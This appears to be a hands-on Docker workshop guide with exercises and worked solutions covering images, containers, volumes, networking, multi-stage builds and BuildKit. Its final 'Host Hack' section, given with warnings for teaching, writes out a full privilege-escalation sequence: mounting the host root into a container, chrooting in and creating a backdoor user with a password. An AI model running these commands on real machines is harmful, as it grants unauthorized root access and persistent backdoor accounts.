# Docker Hands-On

Before starting the exercises, make sure you have `docker` installed on your machine.

---

* [Foundational Docker](#foundational-docker)
  * [Pulling an Image](#pulling-an-image)
  * [Running a Container](#running-a-container)
  * [List all Containers](#list-all-containers)
  * [Get Logs](#get-logs)
  * [Delete a Container](#delete-a-container)
  * [Build an Image from a Dockerfile](#build-an-image-from-a-dockerfile)
* [Intermediate Docker](#intermediate-docker)
  * [Mount Local Files](#mount-local-files)
  * [Inject Environment Variables](#inject-environment-variables)
  * [Automatic Restart](#automatic-restart)
  * [Multi-Stage Builds](#multi-stage-builds)
* [Advanced Docker](#advanced-docker)
  * [Named Volumes](#named-volumes)
  * [Docker Networking](#docker-networking)
  * [Using BuildKit](#using-buildkit)
  * [Host Hack](#host-hack)

---

## Foundational Docker

This section is meant to get you familiar with the `docker` command line tool. This tool is also
called the "Docker client".

In order to solve the exercises in this section, you will probably need to inspect the help pages
from docker using:

```bash
docker --help
# or (on Linux)
man docker

# for sub-commands
docker <cmd> --help
# or
man docker-<cmd>
```

---
---

### Pulling an Image

In this exercise, pull the `alpine:3.15.0` image onto your machine. Alpine is a popular Linux
distribution for containers as it is very small. This allows to pull and push the images much faster
across networks.


<details>
  <summary>Tip</summary>

Check out `docker pull --help` or `man docker-pull`.

</details>

<details>
  <summary>Solution</summary>

```
$ docker pull alpine:3.15.0
3.15.0: Pulling from library/alpine
59bf1c3509f3: Pull complete
Digest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300
Status: Downloaded newer image for alpine:3.15.0
docker.io/library/alpine:3.15.0
```

</details>

---
---

### Running a Container

Run an container based on the `alpine:3.15.0` image such that it prints the hostname of the
container stored under `/etc/hostname`. Name the container `host-printer`.


<details>
  <summary>Tip 1</summary>

Check out `docker run --help` or `man docker-run`.

</details>

<details>
  <summary>Tip 2</summary>

Use the `--name` flag to provide the container name.

</details>

<details>
  <summary>Tip 3</summary>

The command you need to pass is `cat /etc/hostname`.

</details>

<details>
  <summary>Solution</summary>

```
$ docker run --name host-printer alpine:3.15.0 cat /etc/hostname
fec72c948753
```

</details>

---
---

### List all Containers

Containers can be listed using the `docker` command. This is useful to know what containers are
running. Moreover, containers that exit are not deleted by default. List the container you just ran
in the previous exercise.


<details>
  <summary>Tip 1</summary>

Check out `docker container --help` or `man docker-container`.

</details>

<details>
  <summary>Tip 2</summary>

Check out `docker container ls --help` or `man docker-container-ls`.

</details>

<details>
  <summary>Solution</summary>

You need to use the `-a/--all` flag to also list exited containers:

```
$ docker container ls -a
CONTAINER ID   IMAGE                      COMMAND                  CREATED         STATUS                     PORTS                             NAMES
fec72c948753   alpine:3.15.0              "cat /etc/hostname"      4 minutes ago   Exited (0) 4 minutes ago                                     host-printer

$ # or
$ docker ps -a
CONTAINER ID   IMAGE                      COMMAND                  CREATED         STATUS                     PORTS                             NAMES
fec72c948753   alpine:3.15.0              "cat /etc/hostname"      4 minutes ago   Exited (0) 4 minutes ago                                     host-printer
```

> Note that the container ID is the same as the hostname we saw in the output of the last exercise.
> This is because `docker` automatically injects the container ID as the hostname in all containers
> it starts.

</details>

---
---

### Get Logs

Docker captures the logs of all containers for you and provides a convenient sub-command to query
those logs. This can be very useful for debugging issues, metrics gathering, log analysis, and
general monitoring. Get the logs from the `host-printer` container.

<details>
  <summary>Tip</summary>

Check out `docker logs --help` or `man docker-logs`.

</details>

<details>
  <summary>Solution</summary>

> Note you can always reference a container by either its ID or its name. The same is true for
> images.

```
$ docker logs host-printer
fec72c948753

$ # or (change to your container ID)
$ docker logs fec72c948753
fec72c948753
```

We again see the container ID/hostname, the output of the `cat /etc/hostname` command we ran.

</details>

---
---

### Delete a Container

Now we no longer need the container, we can delete it. Please do so.

<details>
  <summary>Tip</summary>

Check out `docker rm --help` or `man docker-rm`.

</details>

<details>
  <summary>Solution</summary>

```
$ docker rm host-printer
host-printer

$ # or
$ docker container rm host-printer
host-printer

$ # or (change to your container ID)
$ docker rm fec72c948753
fec72c948753

$ # or (change to your container ID)
$ docker container rm fec72c948753
fec72c948753
```

Verify that the container is gone:

```
$ docker ps -a
CONTAINER ID   IMAGE                      COMMAND                  CREATED       STATUS          PORTS                             NAMES
```

</details>

---
---

### Build an Image from a Dockerfile

In the [`./app/`][app-dir] directory, you should find a small application.

1. Build the Docker image as defined by the `Dockerfile` and name it `rusty-app:0.1.0`.
2. Check the size of the final image.
3. Run the image.

[app-dir]: ./app/
[main-file]: ./app/src/main.rs

<details>
  <summary>Tip 1 (building)</summary>

Check out `docker build --help` or `man docker-build`.

</details>

<details>
  <summary>Tip 2 (image size)</summary>

You can use `docker images` to inspect images.

</details>

<details>
  <summary>Solution</summary>

In order to build the image, we run:

```
$ # executed from within the ./app/ directory
$ docker build -t rusty-app:0.1.0 ./
Sending build context to Docker daemon   21.5kB
Step 1/5 : FROM rust:1.59.0-slim-bullseye
 ---> 7f642a26afce
Step 2/5 : COPY ./Cargo.* ./
 ---> 19b718c93628
Step 3/5 : COPY ./src/ ./src/
 ---> 45c05fc3915a
Step 4/5 : RUN cargo build --release
 ---> Running in df919064db85
    Updating crates.io index
 Downloading crates ...
  Downloaded lock_api v0.4.6
  Downloaded log v0.4.14
  Downloaded miniz_oxide v0.4.4

  ...

   Compiling simple-log v1.5.1
   Compiling rusty-app v0.1.0 (/)
    Finished release [optimized] target(s) in 45.29s
Removing intermediate container df919064db85
 ---> 273e336ddf75
Step 5/5 : ENTRYPOINT target/release/rusty-app
 ---> Running in 6c07c5f128c9
Removing intermediate container 6c07c5f128c9
 ---> d280377f987f
Successfully built d280377f987f
Successfully tagged rusty-app:0.1.0
```

Then get the size using:

```
$ docker images rusty-app
REPOSITORY   TAG       IMAGE ID       CREATED          SIZE
rusty-app    0.1.0     e588e477fe38   10 seconds ago   1.17GB
```

As we can see the image is 1.17GB. This is very large considering the application does nothing. See
the [Multi-Stage Builds](#multi-stage-builds) exercise on how to reduce the size.

Finally to run the image:

```
$ docker run --rm rusty-app:0.1.0
2022-03-07 18:04:56.908388975 [INFO] <rusty_app:24>:Hello, world!
2022-03-07 18:04:57.575543306 [INFO] <rusty_app:24>:Hello, world!
2022-03-07 18:04:58.242365953 [INFO] <rusty_app:24>:Hello, world!
2022-03-07 18:04:58.908615155 [INFO] <rusty_app:24>:Hello, world!
2022-03-07 18:04:59.574947805 [INFO] <rusty_app:24>:Hello, world!
2022-03-07 18:05:00.242082482 [INFO] <rusty_app:24>:Hello, world!
^Creceived interrupt, stopping
```

</details>

---
---

## Intermediate Docker

---
---

### Mount Local Files

When running containers, you often need to share data from the host into the container. This can be
achieved using Docker volumes.

Create a file `/tmp/ipt-workshop/data.txt` containing the text `hello world!`. Once this is done,
launch a container which mounts `/tmp/ipt-workshop` onto `/mnt/data` and reads the file contents.
The mount should be read-only.

Additionally, make sure the container is _automatically_ deleted after execution.

For all this, use the `alpine:3.15.0` image.

<details>
  <summary>Tip 1</summary>

Check out `docker run --help` or `man docker-run` and look for the keyword "volume".

</details>

<details>
  <summary>Tip 2</summary>

You want to use the `-v/--volume` flag to mount the path.

</details>

<details>
  <summary>Tip 3</summary>

You want to use the `--rm` flag to automatically delete the container after exit.

</details>

<details>
  <summary>Solution</summary>

```
$ mkdir -p /tmp/ipt-workshop
$ echo 'hello world!' > /tmp/ipt-workshop/data.txt
$ docker run --rm -v /tmp/ipt-workshop:/mnt/data:ro alpine:3.15.0 cat /mnt/data/data.txt
hello world!
```

> The `ro` option makes sure the volume is read-only.

</details>

---
---

### Inject Environment Variables

Run a `alpine:3.15.0` container where you inject the `I_DO_DOCKER` environment variable with value
`"Of course I do!"`. Do **not** set the environment variable in your shell. Define the command of the
container such that it echoes `"Do I do docker? $I_DO_DOCKER"` to check that it was injected.

Additionally, make sure the container is _automatically_ deleted after execution.

<details>
  <summary>Tip 1</summary>

You want to use the `-e/--env` flag to set environment variables.

</details>

<details>
  <summary>Tip 2</summary>

Be careful not to evaluate the environment variable in your shell before passing it to the
container. The simplest way to achieve this is to use a wrapping shell (`sh`).

</details>

<details>
  <summary>Solution</summary>

The following will not work:

```
$ docker run --rm -e I_DO_DOCKER='Of course I do!' alpine:3.15.0 echo "Do I do docker? $I_DO_DOCKER"
Do I do docker?
```

The reason is that `$I_DO_DOCKER` gets evaluated in your current shell before passing it to the
container as an environment variable.

You might be tempted to therefore try something such as:

```
$ docker run --rm -e I_DO_DOCKER='Of course I do!' alpine:3.15.0 echo "Do I do docker? \$I_DO_DOCKER"
Do I do docker? $I_DO_DOCKER
```

The issue here is that, depending on your shell (`sh`, `bash`, `zsh`), the content might be passed
raw to the container (it only does variable expansion) which is why it will pass `\$` to the
container which will thus not expand the variable.

The solution is to wrap it in a shell to ensure the `\$` is evaluated to `$` when the argument is
passed, or provide a single quote wrapper:

```
$ docker run --rm -e I_DO_DOCKER='Of course I do!' alpine:3.15.0 sh -c "echo Do I do docker? \$I_DO_DOCKER"
Do I do docker? Of course I do!

$ # or
$ docker run --rm -e I_DO_DOCKER='Of course I do!' alpine:3.15.0 sh -c 'echo "Do I do docker? $I_DO_DOCKER"'
Do I do docker? Of course I do!
```

</details>

---
---

### Automatic Restart

Containers can be restarted on exit automatically. Configure a container that restarts on exit and
performs a short sleep (10s) and then prints `hello again, beautiful world!`.

After a couple of executions manually delete the container. This will prevent it from restarting.

<details>
  <summary>Tip 1</summary>

You will want to use the `--restart` flag to set a restart policy. Make sure you check which one to
use.

</details>

<details>
  <summary>Tip 2</summary>

Use a wrapping shell to execute several commands sequentially.

</details>

<details>
  <summary>Tip 3</summary>

Check the container restarted with `docker ps`.

</details>


<details>
  <summary>Solution</summary>

We will use the following command for the container: `sleep 10; echo "hello again, beautiful
world!"`. This will need to be wrapped in a shell in order to handle the `;` correctly.

Note the container will not fail but exit with status code 0. This means we need to use the `always`
or `unless-stopped` policy. The only difference between those two is whether to start the container
when the daemon boots. Since we will manually delete the container right after, it makes no
difference which one you use.

> Another way to achieve this (but ugly), is to change the command to fail after the print, and then
> use the `on-failure` policy. E.g. `sleep 10; echo "hello again, beautiful world!; exit 1"`

```
$ # be patient it will take 10 seconds to print
$ docker run --restart=unless-stopped --name loop alpine:3.15.0 sh -c 'sleep 10; echo "hello again, beautiful world!"'
hello again, beautiful world!

$ # check that the container was restarted after it exited
$ docker ps
CONTAINER ID   IMAGE           COMMAND                  CREATED              STATUS         PORTS     NAMES
c61eb46c1fb1   alpine:3.15.0   "sh -c 'sleep 10; ec…"   About a minute ago   Up 6 seconds             loop

$ # stop the container
$ # this can take up to 10 seconds, since we do not handle the interrupt in the sleep
$ docker stop loop
loop

$ # delete the container
$ docker rm loop
loop
```

</details>

---
---

### Multi-Stage Builds

In the directory `./app/`, change the `Dockerfile` such that the resulting image contains only the
target binary. Then check the new image size.

> https://docs.docker.com/develop/develop-images/multistage-build/

<details>
  <summary>Tip</summary>

Use `scratch` as a base for the runtime image.

</details>

<details>
  <summary>Solution</summary>

Change the `Dockerfile` to:

```dockerfile
FROM rust:1.59.0-slim-bullseye as builder

WORKDIR /app

# Don't worry about all the x86_64-unknown-linux-musl stuff. It is necessary
# for a later exercise in order to compile the executable generically.
RUN rustup target add x86_64-unknown-linux-musl

# Copy code
COPY ./Cargo.* ./
COPY ./src/ ./src/

# Compile
RUN cargo build --release --target x86_64-unknown-linux-musl

FROM scratch

COPY --from=builder target/x86_64-unknown-linux-musl/release/rusty-app /app

ENTRYPOINT ["/app"]
```

> Note that the entrypoint needs to remain in an array. Providing it as a single string will cause
> the interrupt to no longer reach the application. Why this happens is outside the scope of this
> exercise.

> Moreover, note that the build was preconfigured to work with `scratch`. The compilation needs to
> ensure that we result in a single statically linked executable that uses `musl` as a `libc`
> implementation. Why this is required is also outside the scope of this exercise.

Using the new `Dockerfile`, build the application:

```
$ docker build -t rusty-app:0.1.0 .
Sending build context to Docker daemon  22.02kB
Step 1/8 : FROM rust:1.59.0-slim-bullseye as builder
 ---> 7f642a26afce
Step 2/8 : RUN rustup target add x86_64-unknown-linux-musl
 ---> Using cache
 ---> 40c0ec504a90
Step 3/8 : COPY ./Cargo.* ./
 ---> Using cache
 ---> 703578298e27
Step 4/8 : COPY ./src/ ./src/
 ---> Using cache
 ---> 8b90f01c326e
Step 5/8 : RUN cargo build --release --target x86_64-unknown-linux-musl
 ---> Using cache
 ---> 95bf0993284d
Step 6/8 : FROM scratch
 --->
Step 7/8 : COPY --from=builder target/x86_64-unknown-linux-musl/release/rusty-app /app
 ---> Using cache
 ---> b07ab8c10bb7
Step 8/8 : ENTRYPOINT ["/app"]
 ---> Running in 51051146715f
Removing intermediate container 51051146715f
 ---> c70663b3ad75
Successfully built c70663b3ad75
Successfully tagged rusty-app:0.1.0
```

Now check the size of the new image:

```
$ docker images rusty-app
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
rusty-app    0.1.0     c70663b3ad75   38 seconds ago   4.4MB
```

We can see we decreased the size of the image to only 4.4MB (from 1.17GB!). This is not only better
for performance (less network traffic, faster load into memory), but also improves security as all
the bloat is removed.

</details>

---
---

## Advanced Docker

---
---

### Named Volumes

You might want to have data persist between Docker runs. However, always mounting a hostpath and
managing all your paths might be a hassle. For these use cases, Docker provides named volumes. They
are essentially mount paths that are managed by Docker internally, and that can be referenced by
name.

In this exercise, create a volume named `my-data-vol`. Once you have done this, run a container:

- based on `alpine:3.15.0`
- which continously:
  1. Appends a line to a file (`lines.txt`) which resides on the volume `my-data-vol`.
  2. Prints the line count of the `lines.txt` file.
  3. Sleeps for 2 seconds.

Run the container and kill it after a couple of iterations. Run it again and check that the line
count did not get reset (since the changes were persisted in the volume).

<details>
  <summary>Tip 1</summary>

Check out `docker volume --help` or `man docker-volume`.

</details>

<details>
  <summary>Tip 2</summary>

You can mount a named volume by referencing it by name (e.g. `-v <vol-name>:<mount-path>`).

</details>

<details>
  <summary>Tip 3</summary>

Use the following as a command for your container:

```sh
sh -c '
  while :
  do
    echo "a new line" >> <path-to-volume>/lines.txt
    wc -l <path-to-volume>/lines.txt
    sleep 2
  done
'
```

</details>

<details>
  <summary>Solution</summary>

First we create the volume:

```
$ docker volume create my-data-vol
my-data-vol
```

Then launch the container:

```
$ docker run --rm --name line-loop -v my-data-vol:/mnt/data:rw alpine:3.15.0 sh -c '
$   while :
$   do
$     echo "a new line" >> /mnt/data/lines.txt
$     wc -l /mnt/data/lines.txt
$     sleep 2
$   done
$ '
1 /mnt/data/lines.txt
2 /mnt/data/lines.txt
3 /mnt/data/lines.txt
4 /mnt/data/lines.txt
^C%
```

> Note that the `:rw` option on the mount is not necessary, it is the default. I like to make this
> explicit though.

Running the same command again:

```
$ docker run --rm --name line-loop -v my-data-vol:/mnt/data:rw alpine:3.15.0 sh -c '
$   while :
$   do
$     echo "a new line" >> /mnt/data/lines.txt
$     wc -l /mnt/data/lines.txt
$     sleep 2
$   done
$ '
5 /mnt/data/lines.txt
6 /mnt/data/lines.txt
7 /mnt/data/lines.txt
8 /mnt/data/lines.txt
9 /mnt/data/lines.txt
^C%
```

The data in the file was persisted!

</details>

---
---

### Docker Networking

Docker not only manages images, containers, and volumes, but also virtual networks. These virtual
networks are very interesting to use to isolate containers into their own network.

In this exercise, deploy two containers running the `redis:6.2.6` image. Name one container `server`
and the other `client`. Make sure both container are connected to the same network bridge, which you
should name `my-private-network`.

Once you have this setup, create an interactive shell on the `client`, and connect to the `server`
using the CLI tool:

```sh
redis-cli -h server
```

Redis is a Key/Value store. You can set basic keys with `SET <key> <value>` and read the value back
with `GET <key>`.

<details>
  <summary>Tip</summary>

Check out `docker network --help` or `man docker-network`.

</details>

<details>
  <summary>Solution</summary>

Let's first create the network:

```
$ docker network create my-private-network
fe4f86555728d6fc2b39a62143aa06fdb08f23611de1a19c6fcd94175c1d1f3f
```

We can check that it exists with `docker network list`:

```
$ docker network list
NETWORK ID     NAME                 DRIVER    SCOPE
b7e4034ba219   bridge               bridge    local
8de42c477eb2   host                 host      local
fe4f86555728   my-private-network   bridge    local
41bbd609396e   none                 null      local
```

Then let's start the server and client:

```
$ docker run --rm -d --name server --network my-private-network redis:6.2.6
fe786130b772d6a2e12cf893cabd347daf944f0904ddd45397a144ce2aab6d71

$ docker run --rm -d --name client --network my-private-network redis:6.2.6
26c631b2ce05e793fbc9aaf0f12797c1bb992a5a9af9449739f07607db16ecac
```

Open an interactive shell on the client, connect to the server, and play with Redis:

```
$ docker exec -it client bash
root@26c631b2ce05:/data# redis-cli -h server
server:6379> GET my-key
(nil)
server:6379> SET my-key 42
OK
server:6379> GET my-key
"42"
server:6379> 24 INCR my-key
(integer) 43
(integer) 44
(integer) 45
(integer) 46
(integer) 47
(integer) 48
(integer) 49
(integer) 50
(integer) 51
(integer) 52
(integer) 53
(integer) 54
(integer) 55
(integer) 56
(integer) 57
(integer) 58
(integer) 59
(integer) 60
(integer) 61
(integer) 62
(integer) 63
(integer) 64
(integer) 65
(integer) 66
server:6379> GET my-key
"66"
server:6379>
root@26c631b2ce05:/data# exit
exit
```

We can check that we did indeed connect to the server, since the client has no key set:

```
$ docker exec -it client bash
root@26c631b2ce05:/data# # connect locally by providing no hostname
root@26c631b2ce05:/data# redis-cli
127.0.0.1:6379> GET my-key
(nil)
127.0.0.1:6379>
root@26c631b2ce05:/data# exit
exit
```

Performing some cleanup:

```
$ docker ps
CONTAINER ID   IMAGE         COMMAND                  CREATED         STATUS         PORTS      NAMES
26c631b2ce05   redis:6.2.6   "docker-entrypoint.s…"   8 minutes ago   Up 8 minutes   6379/tcp   client
fe786130b772   redis:6.2.6   "docker-entrypoint.s…"   9 minutes ago   Up 9 minutes   6379/tcp   server

$ docker stop client
client

$ docker stop server
server

$ docker network rm my-private-network
my-private-network
```

</details>

---
---

### Using BuildKit

Docker BuildKit is a overhaul of the build architecture. You can find more information about it
here:

> https://docs.docker.com/develop/develop-images/build_enhancements/

In this exercise, we want to cache the build process of the application. This can be done by caching
two directories during the build process:

1. `/app/target`
2. `/usr/local/cargo/registry`

Use BuildKit to mount such caches. After doing so, change the line being logged in the application
and check that the build process does not download and recompile the dependencies. It should run
extremely fast.

Start with the [`buildkit.dockerfile`][buildkit-dockerfile] Dockerfile. Note that you will not need
to modify the build command in any way. You only need to set the mount and ensure BuildKit is being
used.

[buildkit-dockerfile]: ./app/buildkit.dockerfile

<details>
  <summary>Tip</summary>

Read up on the following:

> https://github.com/moby/buildkit/blob/master/frontend/dockerfile/docs/syntax.md#build-mounts-run---mount

</details>

<details>
  <summary>Solution</summary>

First, ensure you are using BuildKit by running the following export:

```sh
export DOCKER_BUILDKIT=1
```

Once you have done this, change the `build.dockerfile` to:

```dockerfile
# syntax=docker/dockerfile:1.3
FROM rust:1.59.0-slim-bullseye as builder

WORKDIR /app

RUN rustup toolchain install nightly
RUN rustup default nightly
RUN rustup target add x86_64-unknown-linux-musl

# Copy code
COPY ./Cargo.* ./
COPY ./src/ ./src/

# Compile
RUN --mount=type=cache,target=/app/target \
    --mount=type=cache,target=/usr/local/cargo/registry \
    ["cargo", "build", "--release", "--target", "x86_64-unknown-linux-musl", "-Z", "unstable-options", "--out-dir", "/app/bin"]

## Runtime image
FROM scratch

COPY --from=builder /app/bin/rusty-app /app

ENTRYPOINT ["/app"]

# vim:ft=dockerfile
```

> Note the initial comment is very important!

With this we can launch the build using:

```
$ docker build -t rusty-app:0.1.0 -f buildkit.dockerfile .
[+] Building 75.9s (18/18) FINISHED
 => [internal] load build definition from buildkit.dockerfile                                                                                                                                                   0.0s
 => => transferring dockerfile: 646B                                                                                                                                                                            0.0s
 => [internal] load .dockerignore                                                                                                                                                                               0.0s
 => => transferring context: 67B                                                                                                                                                                                0.0s
 => resolve image config for docker.io/docker/dockerfile:1.3                                                                                                                                                    6.1s
 => docker-image://docker.io/docker/dockerfile:1.3@sha256:42399d4635eddd7a9b8a24be879d2f9a930d0ed040a61324cfdf59ef1357b3b2                                                                                      1.1s
 => => resolve docker.io/docker/dockerfile:1.3@sha256:42399d4635eddd7a9b8a24be879d2f9a930d0ed040a61324cfdf59ef1357b3b2                                                                                          0.0s
 => => sha256:93f32bd6dd9004897fed4703191f48924975081860667932a4df35ba567d7426 528B / 528B                                                                                                                      0.0s
 => => sha256:e532695ddd93ca7c85a816c67afdb352e91052fab7ac19a675088f80915779a7 1.21kB / 1.21kB                                                                                                                  0.0s
 => => sha256:24a639a53085eb680e1d11618ac62f3977a3926fedf5b8471ace519b8c778030 9.67MB / 9.67MB                                                                                                                  0.7s
 => => sha256:42399d4635eddd7a9b8a24be879d2f9a930d0ed040a61324cfdf59ef1357b3b2 2.00kB / 2.00kB                                                                                                                  0.0s
 => => extracting sha256:24a639a53085eb680e1d11618ac62f3977a3926fedf5b8471ace519b8c778030                                                                                                                       0.3s
 => [internal] load .dockerignore                                                                                                                                                                               0.0s
 => [internal] load build definition from buildkit.dockerfile                                                                                                                                                   0.0s
 => [internal] load metadata for docker.io/library/rust:1.59.0-slim-bullseye                                                                                                                                    0.0s
 => [builder 1/8] FROM docker.io/library/rust:1.59.0-slim-bullseye                                                                                                                                              0.1s
 => [internal] load build context                                                                                                                                                                               0.1s
 => => transferring context: 14.43kB                                                                                                                                                                            0.0s
 => [builder 2/8] WORKDIR /app                                                                                                                                                                                  0.0s
 => [builder 3/8] RUN rustup toolchain install nightly                                                                                                                                                         13.1s
 => [builder 4/8] RUN rustup default nightly                                                                                                                                                                    0.6s
 => [builder 5/8] RUN rustup target add x86_64-unknown-linux-musl                                                                                                                                               6.8s
 => [builder 6/8] COPY ./Cargo.* ./                                                                                                                                                                             0.0s
 => [builder 7/8] COPY ./src/ ./src/                                                                                                                                                                            0.1s
 => [builder 8/8] RUN --mount=type=cache,target=/app/target     --mount=type=cache,target=/usr/local/cargo/registry     ["cargo", "build", "--release", "--target", "x86_64-unknown-linux-musl", "-Z", "unsta  47.4s
 => [stage-1 1/1] COPY --from=builder /app/bin/rusty-app /app                                                                                                                                                   0.0s
 => exporting to image                                                                                                                                                                                          0.0s
 => => exporting layers                                                                                                                                                                                         0.0s
 => => writing image sha256:c498722161f38a2dec008522a9c70d5d170875605c9a41401267d5b65899403d                                                                                                                    0.0s
 => => naming to docker.io/library/rusty-app:0.1.0                                                                                                                                                              0.0s
```

> The build took 75 seconds.

Let's check that it works:

```
$ docker run --rm rusty-app:0.1.0
2022-03-08 13:01:16.267866997 [INFO] <rusty_app:24>:Hello, world!
2022-03-08 13:01:16.934343111 [INFO] <rusty_app:24>:Hello, world!
2022-03-08 13:01:17.601468645 [INFO] <rusty_app:24>:Hello, world!
2022-03-08 13:01:18.268611268 [INFO] <rusty_app:24>:Hello, world!
2022-03-08 13:01:18.934888805 [INFO] <rusty_app:24>:Hello, world!
^Creceived interrupt, stopping
```

Now let's change the log to `"Hello everyone!"`:

```rust
// on line 24
info!("Hello everyone!");
```

Now let us build again:

```
$ docker build -t rusty-app:0.1.0 -f buildkit.dockerfile .
[+] Building 3.5s (18/18) FINISHED
 => [internal] load build definition from buildkit.dockerfile                                                                                                                                                   0.0s
 => => transferring dockerfile: 47B                                                                                                                                                                             0.0s
 => [internal] load .dockerignore                                                                                                                                                                               0.0s
 => => transferring context: 34B                                                                                                                                                                                0.0s
 => resolve image config for docker.io/docker/dockerfile:1.3                                                                                                                                                    2.1s
 => CACHED docker-image://docker.io/docker/dockerfile:1.3@sha256:42399d4635eddd7a9b8a24be879d2f9a930d0ed040a61324cfdf59ef1357b3b2                                                                               0.0s
 => [internal] load .dockerignore                                                                                                                                                                               0.0s
 => [internal] load build definition from buildkit.dockerfile                                                                                                                                                   0.0s
 => [internal] load metadata for docker.io/library/rust:1.59.0-slim-bullseye                                                                                                                                    0.0s
 => [builder 1/8] FROM docker.io/library/rust:1.59.0-slim-bullseye                                                                                                                                              0.0s
 => [internal] load build context                                                                                                                                                                               0.0s
 => => transferring context: 780B                                                                                                                                                                               0.0s
 => CACHED [builder 2/8] WORKDIR /app                                                                                                                                                                           0.0s
 => CACHED [builder 3/8] RUN rustup toolchain install nightly                                                                                                                                                   0.0s
 => CACHED [builder 4/8] RUN rustup default nightly                                                                                                                                                             0.0s
 => CACHED [builder 5/8] RUN rustup target add x86_64-unknown-linux-musl                                                                                                                                        0.0s
 => CACHED [builder 6/8] COPY ./Cargo.* ./                                                                                                                                                                      0.0s
 => [builder 7/8] COPY ./src/ ./src/                                                                                                                                                                            0.0s
 => [builder 8/8] RUN --mount=type=cache,target=/app/target     --mount=type=cache,target=/usr/local/cargo/registry     ["cargo", "build", "--release", "--target", "x86_64-unknown-linux-musl", "-Z", "unstab  1.0s
 => [stage-1 1/1] COPY --from=builder /app/bin/rusty-app /app                                                                                                                                                   0.0s
 => exporting to image                                                                                                                                                                                          0.0s
 => => exporting layers                                                                                                                                                                                         0.0s
 => => writing image sha256:d9c983024fa50473667d62abea02d988c7b34b22536659510276908682569b5a                                                                                                                    0.0s
 => => naming to docker.io/library/rusty-app:0.1.0                                                                                                                                                              0.0s
```

> Thanks to the caching, the build now only took 3.5 seconds!

Let's try the application:

```
$ docker run --rm rusty-app:0.1.0
2022-03-08 13:02:48.572314079 [INFO] <rusty_app:24>:Hello everyone!
2022-03-08 13:02:49.238526698 [INFO] <rusty_app:24>:Hello everyone!
2022-03-08 13:02:49.905180936 [INFO] <rusty_app:24>:Hello everyone!
2022-03-08 13:02:50.572334707 [INFO] <rusty_app:24>:Hello everyone!
^Creceived interrupt, stopping
```

</details>

---
---

### Host Hack

> **ATTENTION!!!** You can destroy your computer if you do not know what you are doing in this
> exercise! Check the solution **before** executing any command you feel could be destructive. Read
> the following very carefully.

> Use the information below for educative purposes only. Misusing software (such as Docker) for
> malicious purposes can be illegal and punishable by law.

> Disclaimer: the solution below only works for Linux (and maybe MacOS). The same attack is possible
> on Windows, but requires drastically different commands.

Here we will have a short look at why Docker is quite a dangerous tool. Anyone that can run
`docker` on your machine is essentially superuser. We will use `docker` to create a new user on the
host machine without ever being prompted for the admin password (or any password for that matter).

The feature we will be misusing here is that Docker performs no user-mapping by default on running
containers. This means that a process in a container running as root will have UID 0 outside its
process namespace. This is dangerous, because it means that if you manage to somehow escape the
container isolation, the user from the container will have root access on the host.

The goal of this exercise is to create a new user (`johndoe`) on your host machine without needing
to enter any password. Have fun!

<details>
  <summary>Tip 1</summary>

You are root by default in a container you run unless specified otherwise in the image declaration.

</details>

<details>
  <summary>Tip 2</summary>

Use a container image that uses the same distribution of your host machine.

</details>

<details>
  <summary>Tip 3</summary>

You can mount your entire PC into a docker container ...

</details>

<details>
  <summary>Tip 4</summary>

You can use `chroot` to change the root of your file system ...

</details>

<details>
  <summary>Solution</summary>

The general idea we want to achieve is:

- Run a container with the same distro of your host. Note that it does not need to match exactly,
  since user management is pretty standardized across all major Linux distributions (and MacOS).
- Mount our entire PC/laptop into the container (as a volume).
- Change the filesystem root to be the same as our laptop (with `chroot`).
- Create the user (with `useradd` and if desired set a password with `passwd`).

First let's check that the user `johndoe` does not already exist on my host machine:

```
$ cat /etc/passwd | grep johndoe
<empty>
```

Good!

The command we will use to create the user is:

```
useradd --no-log-init --no-create-home --no-user-group johndoe
```

The flags we give are simply to make the cleanup easier. Note that running this on your host will
result in a permissions error. This is because it requires administrative rights, which we assume we
do not have for this exercise.

```
$ whoami
jakob

$ useradd --no-log-init --no-create-home --no-user-group johndoe
useradd: Permission denied.
useradd: cannot lock /etc/passwd; try again later.
```

I am running Arch Linux on my host machine, so I will use this for my attack container. This would
not be strictly necessary, but I am most familiar with it and it ensures the most consistency if I
were to create a user I would plan to use seriously for backdoor access.

Let us run the container and mount our entire machine into the container:

```
$ # pull the latest version (important since Arch is a rolling release)
$ docker pull archlinux:latest
$ docker run -it --rm -v /:/mnt/host archlinux:latest bash
[root@72e75a9de4ef /]# chroot /mnt/host
sh-5.1# useradd --no-log-init --no-create-home --no-user-group johndoe
sh-5.1# # set a password for good measure (I used "secret" for simplicity)
sh-5.1# passwd johndoe
New password:
Retype new password:
passwd: password updated successfully
sh-5.1# exit
exit
[root@72e75a9de4ef /]# exit
exit
```

Now that we are back on our host, let's check that the user exists:

```
$ cat /etc/passwd | grep johndoe
johndoe:x:1001:985::/home/johndoe:/bin/bash
```

Yup, we just created a user without requiring admin privileges...

Let's try to login as that user (use the password you set above, if you did set one):

```
$ su johndoe
Password:
[johndoe@revenge-xps viscon-workshop-04-2022]$ whoami
johndoe
[johndoe@revenge-xps viscon-workshop-04-2022]$ exit
exit
```

And perform cleanup on your host machine:

```
$ sudo userdel -r johndoe
userdel: johndoe mail spool (/var/spool/mail/johndoe) not found
userdel: johndoe home directory (/home/johndoe) not found

$ cat /etc/passwd | grep johndoe
<empty>
```

I seriously hope it scared you a little how easy it is to essentially do whatever you want on any
machine on which you have permissions to run `docker`...

</details>
